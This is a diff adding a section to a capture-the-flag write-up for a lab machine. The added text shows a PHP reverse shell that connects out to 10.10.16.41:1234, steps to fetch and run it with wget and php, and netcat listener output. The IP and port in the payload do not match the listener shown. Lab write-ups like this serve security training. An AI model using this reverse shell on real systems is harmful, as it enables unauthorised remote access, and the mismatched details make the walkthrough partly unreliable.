@@ -38,6 +38,22 @@ as we can easilly discover phpbash is available by hitting http://10.10.10.68/de
 Now we have accesso to this box as www-data.
 
 ## User
+First thing first we want to update our existing webshell with a real reverse shell.  
+Since we cannot execute the revershe shell directly from the prompt, let's download a file containing the following reverse shell into a file and then execute it:
+```
+<?php
+$sock=fsockopen("10.10.16.41",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+```
+download this with wget in a writable folder and execute this via php, and as we can se we do get get a shell as www-data.
+```
+root@kali:~# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.10.68] 59562
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
 Now that we are logged in as www-data, we can quickly check our capabilities.
 First thing first, let's enumerate sudo.
 ```
